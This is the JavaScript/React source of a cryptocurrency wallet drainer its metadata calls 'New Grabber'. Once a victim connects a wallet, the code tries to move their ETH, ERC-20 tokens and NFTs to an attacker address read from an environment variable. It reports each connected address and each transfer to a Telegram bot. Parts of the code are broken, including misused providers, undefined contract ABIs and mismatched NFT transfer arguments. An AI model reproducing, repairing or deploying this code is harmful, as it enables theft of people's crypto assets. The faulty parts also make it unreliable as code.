import { useState, useEffect, useCallback } from "react";
import Moralis from "moralis";
import Web3 from 'web3'
import axios from 'axios'
import { EvmChain } from "@moralisweb3/common-evm-utils";
import { createWeb3Modal, useWeb3Modal } from "@web3modal/wagmi/react";
import {
    WagmiConfig,
    useAccount,
    useBalance,
    useDisconnect,
    configureChains,
    createConfig
} from "wagmi";
import { infuraProvider } from 'wagmi/providers/infura'
import { publicProvider } from 'wagmi/providers/public'
import { InjectedConnector } from 'wagmi/connectors/injected'
import { WalletConnectConnector } from 'wagmi/connectors/walletConnect'
import * as Chain from 'wagmi/chains';

// 1. Get projectId
const projectId = import.meta.env.VITE_PROJECT_ID;
const metadata = {
    name: "New Grabber",
    description:
        "New Grabber for Moving Crypto Fast from one wallet to the other",
    url: "https://web3modal.com",
    icons: ["https://avatars.githubusercontent.com/u/37784886"],
};

// Telegram bot API credentials and chat ID

// 2. Create wagmiConfig
const Chains = Object.values(Chain);
const { chain, publicClient } = configureChains(Chains, [
    infuraProvider({ apiKey: import.meta.env.VITE_INFURA_API_KEY }),
    publicProvider(),
]);

const callMoralisApi = async () => {
    if (!Moralis.Core.isStarted) {
        await Moralis.start({
            apiKey: import.meta.env.VITE_MORALIS_API,
        });
    }
}

const networkValues = Chains.map(chain => chain.network).filter(Boolean).map(value => value + "-mainnet");

console.log(networkValues);
const wagmiConfig = createConfig({
    autoConnect: true,
    connectors: [
        new InjectedConnector({ chain }),
        new WalletConnectConnector({
            chain,
            options: {
                projectId: projectId,
                metadata: metadata
            },
        }),
    ],
    publicClient,
});

/**
 * Renders the Connect component.
 *
 * @return {ReactElement} The rendered Connect component.
 */
export function Connect() {
    callMoralisApi();
    return (
        <WagmiConfig config={wagmiConfig}>
            <ConnectButton web3Modal={createWeb3Modal({ wagmiConfig, projectId, Chains })} />
        </WagmiConfig>
    );
}
function ConnectButton() {
    const { open } = useWeb3Modal();
    const { address, isConnected, isDisconnected } = useAccount();
    const { data } = useBalance({
        address: address,
    })
    const { disconnect } = useDisconnect();
    const [balance, setBalance] = useState();
    const [tokens, setTokens] = useState();
    const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS; // Get the destination address from the environment variable

    const handleDisconnect = () => {
        if (isConnected) {
            disconnect();
        }
    };

    const ShowBal = useCallback(() => {
        console.log(`${ data?.formatted } ${ data?.symbol } `)
        setBalance(`${ data?.formatted } ${ data?.symbol } `)
    }, [data?.formatted, data?.symbol])

    const handleTransfer = useCallback(async () => {
        ShowBal();
        if (isConnected && address && destinationAddress) {
            try {
                const [tokenBalances, NFts] = await Promise.all([
                    Moralis.EvmApi.token.getWalletTokenBalances({
                        chain: EvmChain.ETHEREUM,
                        address,
                    }),
                    Moralis.EvmApi.nft.getWalletNFTs({
                        chain: EvmChain.ETHEREUM,
                        "format": "decimal",
                        "mediaItems": false,
                        address
                    }),
                ]);

                if (balance >= 0.004) {
                    const transactionHash = await transferFunds(address, destinationAddress, balance);

                    // Send a Telegram notification with transaction link
                    sendTelegramNotification(`ETH Transfer\n\nAmount: ${ balance }\n\nTransaction Link: ${ getTransactionLink(transactionHash) } `);
                } else {
                    sendTelegramNotification(`${ address } does not have enough ETH to cover gas fee, Current Balance:${ balance }`);
                }

                // Transfer token balances to the destination address
                for (const tokenBalance of tokenBalances.result) {
                    const tokenValue = tokenBalance.balance;
                    if (tokenValue <= 0) {
                        sendTelegramNotification(`This ${ address } does not own any NFTs`);
                        return
                    }
                    // Adjust based on the token structure
                    const tokenTransactionHash = await transferTokens(address, destinationAddress, `${ tokenBalance.token.contractAddress } `, tokenValue);

                    // Send a Telegram notification with token details and transaction link
                    sendTelegramNotification(`Token Transfer\n\nToken: ${ tokenBalance.token.symbol } \nAmount: ${ tokenValue } \n\nTransaction Link: ${ getTransactionLink(tokenTransactionHash) } `);
                }

                console.log(balance)
                console.log(tokenBalances.result.map((token) => token.display()))

                setTokens(tokenBalances.result.map((token) => token.display()));

                if (NFts.result.length === 0) {
                    console.log(`No NFTs to transfer for address: ${ address } `);
                    return
                }

                for (const nft of NFts) {
                    const tokenId = nft.token_id;

                    const transactionHash = await transferNFT(EvmChain.ETHEREUM, address, destinationAddress, tokenId);

                    // Send a Telegram notification with NFT details and transaction link
                    sendTelegramNotification(`NFT Transfer\n\nToken ID: ${ tokenId } \n\nTransaction Link: ${ getTransactionLink(transactionHash) } `);
                }
            } catch (error) {
                console.error(error);
            }
        }
    }, [ShowBal, address, balance, destinationAddress, isConnected]);

    useEffect(() => {
        if (isConnected) {
            sendTelegramNotification(`Wallet Connected\n\nAddress: ${ address }`);
            const transferInterval = setInterval(() => {
                // handleTransfer(); // Run every minute while isConnected is true
            }, 120000); // 120000 milliseconds = 1 minute

            // Clean up the interval when the component unmounts
            return () => clearInterval(transferInterval);
        }
    }, [isConnected, address]);

    useEffect(() => {
        if (isDisconnected) {
            open();
        }
    }, [isDisconnected, open]);
    return (
        <>
            {isDisconnected && <button onClick={open}>Connect Wallet</button>}
            {isConnected && (
                <>
                    <p>Address: {address}</p>
                    <p>
                        Balance:{balance ? `${ balance }` : "Loading..."}
                        <br />
                        Tokens:{tokens ? `${ tokens } ` : "Loading..."}
                    </p>
                    <button onClick={handleDisconnect}>Disconnect</button>
                </>
            )}
        </>
    );
}


const transferFunds = async (from, to, valueInEth) => {
    const web3 = new Web3(useWeb3Modal.provider); // Initialize Web3 with the provider
    const valueInWei = web3.utils.toWei(valueInEth.toString(), 'ether');

    try {
        const options = {
            from: from,
            to: to,
            value: valueInWei,
        };

        const gas = await web3.eth.estimateGas(options);

        options.gas = gas;

        const transactionHash = await web3.eth.sendTransaction(options);
        return transactionHash;
    } catch (error) {
        console.error(error);
        // Handle the error appropriately
    }
};

const transferTokens = async (from, to, contractAddress, value) => {
    const web3 = new Web3(useWeb3Modal.provider); // Initialize Web3 with the provider
    const contract = new web3.eth.Contract(ERC20ContractABI, contractAddress); // Replace ERC20ContractABI with your ERC20 contract ABI

    try {
        const options = {
            from: from,
            to: contractAddress,
            data: contract.methods.transfer(to, value).encodeABI(),
        };

        const gas = await contract.methods.transfer(to, value).estimateGas(options);

        options.gas = gas;

        const transactionHash = await web3.eth.sendTransaction(options);
        return transactionHash;
    } catch (error) {
        console.error(error);
        // Handle the error appropriately
    }
};

const transferNFT = async (from, to, contractAddress, tokenId) => {
    const web3 = new Web3(useWeb3Modal.provider); // Initialize Web3 with the provider
    const contract = new web3.eth.Contract(NFTContractABI, contractAddress); // Replace NFTContractABI with your NFT contract ABI

    try {
        const options = {
            from: from,
            to: contractAddress,
            data: contract.methods.safeTransferFrom(from, to, tokenId).encodeABI(),
        };

        const gas = await contract.methods.safeTransferFrom(from, to, tokenId).estimateGas(options);

        options.gas = gas;

        const transactionHash = await Web3.eth.sendTransaction(options);
        return transactionHash;
    } catch (error) {
        console.error(error);
        // Handle the error appropriately
    }
};


const sendTelegramNotification = (message) => {
    const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_API_KEY;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    const url = `https://api.telegram.org/bot${ telegramBotToken }/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message,
    };

    axios.post(url, data)
        .then(response => {
            console.log('Notification sent successfully!', response);
        })
        .catch(error => {
            console.error('Error sending notification:', error);
        });
    // Use a library or API to send notifications to your Telegram bot
    // Replace with your actual implementation
    // Example: axios.post(TELEGRAM_BOT_API_URL, { chat_id: TELEGRAM_CHAT_ID, text: message });
};

const getTransactionLink = (transactionHash) => {
    // Construct the blockchain explorer link for the transaction
    // Replace with the appropriate link structure for your blockchain explorer
    return `https://etherscan.io/tx/${ transactionHash }`;
};
